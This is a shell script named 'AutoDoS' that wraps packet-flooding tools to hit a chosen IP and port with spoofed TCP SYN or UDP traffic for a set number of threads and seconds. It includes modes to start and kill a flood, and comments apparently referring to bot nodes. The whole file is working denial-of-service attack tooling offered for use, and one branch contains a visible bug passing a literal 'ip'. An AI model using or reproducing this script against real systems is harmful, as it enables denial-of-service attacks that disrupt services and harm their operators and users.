#!/var/bin/ash
# AutoDoS - Shell Wrapper to Send Multiple Spoofed Packets
# ShellzRus 2016
#

mode=$1
ip=$2
port=${3:-"80"}
threads=${4:-"5"}
secs=${5:-"30"}

statfile=/tmp/.status


#SEQ(){i=0;while [[ "$i" -lt 10 ]];do echo $i; i=`expr $i + 1`;done}
usage(){
echo " \
-###################################################-
 Auto-Dos Version 3.0
  Usage:
  $0 [target ip][port][threads][secs]
  Default: 5 threads/30 sec Max: 20 threads/300 sec
-##################################################-"
}

finish(){
    if [[ -s "$statfile" ]];then
     >$statfile
    fi
}

tcp(){
#echo "$thisbot :"
port=${2:-"80"}
threads=${3:-"5"}
secs=${4:-"30"}
echo "Hitting $ip:$port For $secs secs with $threads threads mode tcp"
ssyn2 $ip $port $threads $secs >/dev/null & echo "$!" > $statfile
sleep $secs && finish
}
udp(){
port=${2:-"80"}
threads=${3:-"5"}
secs=${4:-"30"}
#echo "$thisbot :"
echo "Hitting $ip:$port for $secs secs with $threads threads mode udp"
sudp $ip $port 1 $threads $secs >/dev/null & echo "$!" > $statfile
sleep $secs && finish
}

killIt(){
kill -9 `cat $statfile`;([ "$?" -eq "0" ]) && echo "Killed";>$statfile
}

check(){

if [[ ! -f $statfile ]];then touch $statfile;fi
stat=`cat $statfile`
#thisBot=`/sbin/ifconfig eth1 | grep Mask | cut -d ':' -f2 | cut -d " " -f1`
if ([[ "$ip" == "" ]] || [[ "$port" == "" ]] || [[ "$threads" -gt "20" ]] || [[ "$secs" -gt "300" ]] )
then
usage
exit 1
else 
if [ -s $statfile ] ;then
echo System is busy. Wait a minute.
exit 1
fi
fi
}

case $mode in -t|--tcp)

check
trap finish 1 2 8
tcp $ip $port $threads $secs

;;
-u|--udp)
check
trap finish 1 2 8
udp ip $port $threads $secs

;;

-k|--kill)
killIt
;;
*)
echo "$0 [mode[--tcp/--udp]] [ip] [port] [thread] [secs]"
;;
esac

exit
